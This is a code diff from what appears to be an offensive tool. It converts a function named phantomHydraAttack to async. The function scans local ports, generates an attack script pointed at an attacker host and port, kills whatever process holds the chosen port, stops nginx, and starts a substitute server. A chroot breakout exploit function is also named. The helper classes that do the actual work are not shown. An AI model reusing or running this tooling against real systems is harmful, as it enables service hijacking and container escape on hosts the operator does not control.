@@ -5,7 +5,7 @@ from custom_server import CustomServer
 import ctypes
 import os
 import subprocess
-import time
+import asyncio
 
 
 def _scan_localhost_ports(start_port=1, end_port=65535):
@@ -62,17 +62,23 @@ def _has_chroot_capability():
         return False
     
 
-def phantomHydraAttack(port_start, port_end, attack_host, attack_port):
+
+async def phantomHydraAttack(port_start, port_end, attack_host, attack_port):
     _scan_localhost_ports(port_start, port_end)
     port = int(input("Enter Open Port on which you want to continue: "))
+
     custom_server = CustomServer(port=port)
-    custom_server.generate_script_for_attack(host=attack_host,port=attack_port)
+    custom_server.generate_script_for_attack(host=attack_host, port=attack_port)
+
     processManager = ProcessManager(port=port)
-    processManager.kill_process_on_port()
-    if (processManager.is_nginx_running()):
-        processManager.stop_nginx()
-    time.sleep(2)
+
+    await processManager.kill_process_on_port()
+
+    if await processManager.is_nginx_running():
+        await processManager.stop_nginx()
+
     custom_server.start_server()
+
 
 
 def chrootBreakOutExploit():
